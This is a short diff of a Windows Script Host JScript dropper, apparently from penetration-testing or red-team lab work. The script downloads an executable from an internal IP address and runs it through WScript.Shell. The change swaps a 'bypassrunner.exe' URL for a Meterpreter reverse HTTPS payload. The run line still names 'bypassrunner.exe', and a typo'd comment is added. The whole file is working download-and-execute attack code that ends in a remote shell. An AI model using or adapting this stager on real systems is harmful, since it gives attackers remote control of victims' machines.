@@ -1,4 +1,4 @@
-var url = "http://172.21.23.10/bypassrunner.exe"
+var url = "http://10.0.0.234/temp_bin/windows_x64_meterpreter_reverse_https.exe"
 var Object = WScript.CreateObject('MSXML2.XMLHTTP');
 
 Object.Open('GET', url, false);
@@ -18,3 +18,5 @@ if (Object.Status == 200)
 }
 
 var r = new ActiveXObject("WScript.Shell").Run("bypassrunner.exe");
+
+// wscritp test.js
